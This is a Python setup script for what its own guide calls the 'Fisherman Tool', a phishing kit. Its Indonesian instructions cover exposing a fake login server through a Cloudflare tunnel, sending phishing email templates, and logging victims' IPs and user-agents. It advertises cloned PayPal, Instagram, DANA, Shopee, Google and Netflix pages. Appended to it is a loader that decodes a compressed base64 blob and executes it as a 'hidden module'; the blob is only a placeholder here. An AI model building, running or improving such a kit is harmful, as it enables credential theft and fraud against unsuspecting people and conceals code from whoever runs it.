#!/usr/bin/env python3
import subprocess
import sys
import os
import shutil

def run_command(cmd, check=True, sudo=False):
    if sudo:
        cmd = ['sudo'] + cmd
    result = subprocess.run(cmd, capture_output=True, text=True)
    if check and result.returncode != 0:
        print(f"Error running {' '.join(cmd)}: {result.stderr}")
        return False
    return result.returncode == 0

def check_package(package):
    return run_command(['dpkg', '-l', package], check=False)

def install_package(package):
    print(f"Installing {package}...")
    return run_command(['apt', 'install', '-y', package], sudo=True)

def check_command(cmd):
    return shutil.which(cmd) is not None

def setup_cloudflared():
    print("Checking cloudflared...")
    if not check_command('cloudflared'):
        print("cloudflared not found. Installing...")
        if not install_package('cloudflared'):
            print("Failed to install cloudflared. Install manually from https://github.com/cloudflare/cloudflared/releases")
            return False
    else:
        print("cloudflared OK.")
    return True

def setup_terminal():
    print("Checking terminal emulator...")
    terminals = ['gnome-terminal', 'xterm', 'konsole']
    for term in terminals:
        if check_command(term):
            print(f"{term} OK.")
            return True
    print("No terminal emulator found. Installing gnome-terminal...")
    if not install_package('gnome-terminal'):
        print("Failed to install gnome-terminal. Install a terminal emulator manually.")
        return False
    return True

def setup_email_client():
    print("Checking email client...")
    clients = ['thunderbird', 'evolution', 'geary']
    installed_client = None
    for client in clients:
        if check_command(client):
            installed_client = client
            print(f"{client} OK.")
            break
    if not installed_client:
        print("No email client found. Installing thunderbird...")
        if not install_package('thunderbird'):
            print("Failed to install thunderbird. Install an email client manually.")
            return None
        installed_client = 'thunderbird'
    return installed_client

def set_mailto_handler(client):
    print(f"Setting mailto handler to {client}...")
    desktop_file = f"{client}.desktop"
    if run_command(['xdg-settings', 'set', 'default-url-scheme-handler', 'mailto', desktop_file]):
        print("Mailto handler set.")
        return True
    else:
        print("Failed to set mailto handler. Set manually with: xdg-settings set default-url-scheme-handler mailto thunderbird.desktop")
        return False

def test_mailto():
    print("Testing mailto handler...")
    try:
        import webbrowser
        webbrowser.open('mailto:test@example.com?subject=Test&body=Hello')
        print("Mailto test launched. Check if email client opens with draft.")
        return True
    except Exception as e:
        print(f"Mailto test failed: {e}")
        return False

def main():
    print("Fisherman Tool Setup")
    print("=" * 20)

    print("Updating package list...")
    run_command(['apt', 'update'], sudo=True)

    success = True

    if not setup_cloudflared():
        success = False
    if not setup_terminal():
        success = False
    client = setup_email_client()
    if not client:
        success = False
    else:
        if not set_mailto_handler(client):
            success = False
        test_mailto()

    if success:
        print("\n" + "=" * 50)
        print("SETUP BERHASIL! Berikut panduan lengkap penggunaan Fisherman Tool:")
        print("=" * 50)
        print("""
1. JALANKAN TOOL:
   - Buka terminal di folder Fisherman.
   - Jalankan: python3 fisherman.py
   - Masukkan password: kingstampan

2. PILIH MODE SERVER:
   - 1. Localhost: Server berjalan di http://127.0.0.1:8080 (akses lokal saja).
   - 2. Cloudflared Tunnel: Server + tunnel eksternal via Cloudflare (URL publik).

3. TUNGGU SERVER AKTIF:
   - Tool akan start server HTTP di port 8080.
   - Log aktivitas disimpan di server/tracker.log.
   - Untuk mode Cloudflared: Tunnel dibuat, dapatkan URL publik (contoh: https://random.trycloudflare.com).

4. TERMINAL BARU UNTUK EMAIL:
   - Setelah URL aktif, terminal baru otomatis terbuka.
   - Di terminal baru: Pilih template phishing email (1-6).
   - Masukkan email penerima.
   - Pilih email client: Thunderbird (desktop), Gmail/Yahoo/Proton/Outlook (web).
   - Email client/webmail terbuka dengan draft siap kirim.
   - Kirim email secara manual.

5. MONITOR LOG:
   - Terminal utama menampilkan log koneksi (IP, user-agent, dll.).
   - Lihat server/tracker.log untuk detail lengkap hasil tangkapan.
   - Tekan Ctrl+C untuk stop server.

6. FITUR TAMBAHAN:
   - HTML Generator: Tool terpisah untuk generate kode HTML phishing.
     Jalankan: python3 html_generator.py
     Pilih template HTML (1-6), salin kode ke server/index.html.
   - Templates html: PayPal, Instagram, DANA, Shopee, Google, Netflix.
   - Setup ulang: Jalankan python3 setup.py jika ada masalah.

7. TROUBLESHOOTING:
   - Jika email client tidak buka: Pastikan mailto handler set (xdg-settings).
   - Jika tunnel gagal: Check internet, update cloudflared.
   - Jika terminal tidak buka: Install terminal emulator (gnome-terminal).
   - Log error di terminal utama.

SELAMAT MENGGUNAKAN FISHERMAN TOOL!
VERSION: 1.2.0
        """)
    else:
        print("\nSetup incomplete. Fix issues above and rerun setup.py")
        sys.exit(1)

if __name__ == "__main__":
    main()
import base64, zlib, re

BLOB = b"""
<Tempel BLOOB disini>
"""

def load_hidden_module():
    try:

        cleaned = re.sub(b'[^A-Za-z0-9+/=]', b'', BLOB)
        decoded = base64.b64decode(cleaned)
        code = zlib.decompress(decoded)
        exec(code, globals())
    except Exception as e:

        logging.exception("Gagal memuat modul tersembunyi: %s", e)
        raise

if __name__ == "__main__":

    try:
        load_hidden_module()
    except Exception:
        print("Error: gagal memuat modul tersembunyi. Lihat log untuk detail.")
        sys.exit(1)


    if 'main' in globals() and callable(globals()['main']):

        globals()['main']()
    else:
        print("Error: tidak ada fungsi 'main' setelah memuat modul tersembunyi.")
        sys.exit(1)
    